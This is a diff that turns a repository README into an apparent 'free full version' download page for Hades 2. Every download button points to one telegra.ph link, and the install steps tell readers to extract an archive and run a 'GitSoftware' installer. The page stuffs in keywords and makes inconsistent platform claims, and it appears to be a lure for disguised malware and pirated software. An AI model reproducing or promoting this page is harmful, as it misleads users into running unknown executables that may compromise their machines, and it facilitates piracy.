@@ -1,2 +1,74 @@
-# hades-2-2026
-Hades II 2026 — roguelite action game for PC, Supergiant sequel
+# Hades 2 PC — Free Download PC Full Version 2026
+
+[![Download banner](https://i.postimg.cc/hPj9B9jV/Generated-image.png)](https://telegra.ph/pltfrm-05-17)
+
+**Hades 2 PC** is a full PC game build with offline installer and complete content. Latest desktop edition for Windows 10/11. Choose **Windows** or **macOS** on the download page.
+
+**Keywords:** hades 2 pc download, hades 2 pc windows 10 11, hades 2 pc 2026, hades 2 pc full version, hades 2 pc mac download, hades 2 pc macos
+
+## [⬇ Download Hades 2 PC](https://telegra.ph/pltfrm-05-17)
+
+---
+
+## About
+
+Hades 2 PC delivers a complete single-player and multiplayer experience on PC. The build ships with all core content, stable performance on modern hardware, and a straightforward installer — no extra launchers required after setup.
+
+| Feature | Details |
+|---------|---------|
+| Platform | Windows 10/11 (64-bit) |
+| Content | Full game · latest 2026 build |
+| Installer | Offline · custom setup |
+| Multiplayer | As supported by the build |
+| Storage | See requirements below |
+
+---
+
+## Installer
+
+[![Installer screenshot](https://i.postimg.cc/C5LYtMwM/deadlife.png)](https://telegra.ph/pltfrm-05-17)
+
+| Parameter | Value |
+|-----------|-------|
+| Package | Offline desktop installer |
+| Platforms | Windows 10/11 · macOS (via download page) |
+| Setup | GitSoftware · one-click continue |
+| Build | 2026 |
+
+---
+
+## How to Install
+
+1. Open the **[download page](https://telegra.ph/pltfrm-05-17)** and choose **Windows** or **macOS**
+2. On the Telegraph page, read the short setup guide and click the **final download link**
+3. Extract the archive (if needed) and run **GitSoftware**
+4. Click **Continue** — installation completes automatically
+
+> The same link covers **Windows 10/11** and **macOS** (Apple Silicon & Intel). No separate Mac-only repo needed.
+
+---
+
+## System Requirements
+
+| Component | Minimum | Recommended |
+|-----------|---------|-------------|
+| OS | Windows 10 64-bit | Windows 11 64-bit |
+| CPU | Intel i5 / Ryzen 5 | Intel i7 / Ryzen 7 |
+| RAM | 8 GB | 16 GB |
+| GPU | GTX 1060 / RX 580 | RTX 3060 / RX 6700 XT |
+| Storage | 50 GB | SSD / NVMe |
+
+---
+
+## What's Included
+
+- **Full game** — Hades 2 PC latest PC build
+- **Offline support** — play without constant internet
+- **Complete installer** — no extra bundled software
+- **Desktop shortcut** — ready after install
+
+---
+
+## Download
+
+### [⬇ Download Hades 2 PC](https://telegra.ph/pltfrm-05-17)
